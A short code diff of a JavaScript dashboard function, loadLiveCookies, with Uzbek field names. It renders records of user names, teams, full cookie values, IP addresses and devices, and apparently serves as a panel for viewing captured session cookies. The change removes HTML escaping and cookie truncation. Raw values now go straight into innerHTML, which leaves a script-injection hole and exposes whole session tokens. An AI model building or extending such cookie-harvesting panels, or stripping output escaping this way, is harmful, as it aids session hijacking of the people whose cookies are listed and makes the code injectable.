@@ -624,12 +624,14 @@ async function loadLiveCookies() {
     if (!res.success) return;
     document.getElementById('cookiesBody').innerHTML = res.cookies.map(c => `
         <tr>
-            <td style="font-size:.7rem">${new Date(c.at).toLocaleTimeString('uz-UZ')}</td>
-            <td><strong>${esc(c.name)}</strong></td><td><span class="badge b-blue">${esc(c.team)}</span></td>
-            <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis"><code style="font-size:.65rem;color:var(--cyan)">${esc(c.cookie.slice(0, 30))}...</code></td>
-            <td style="font-size:.7rem">${esc(c.ip)}</td>
+            <td>${c.vaqt ? new Date(c.vaqt).toLocaleString('uz-UZ') : '-'}</td>
+            <td>${c.foydalanuvchi || '-'}</td>
+            <td>${c.team || '-'}</td>
+            <td style="max-width: 400px; word-break: break-all; white-space: normal !important; color: #4A7FFF; font-family: monospace;">${c.cookie || '-'}</td>
+            <td>${c.ip || '-'}</td>
+            <td style="max-width: 250px; word-break: break-word; white-space: normal !important; font-size: 0.85em; color: #aaa;">${c.qurilma || 'Nomalum'}</td>
         </tr>
-    `).join('') || "<tr><td colspan='5' style='text-align:center;'>Ma'lumot topilmadi</td></tr>";
+    `).join('');
 }
 
 async function loadAcademy() {
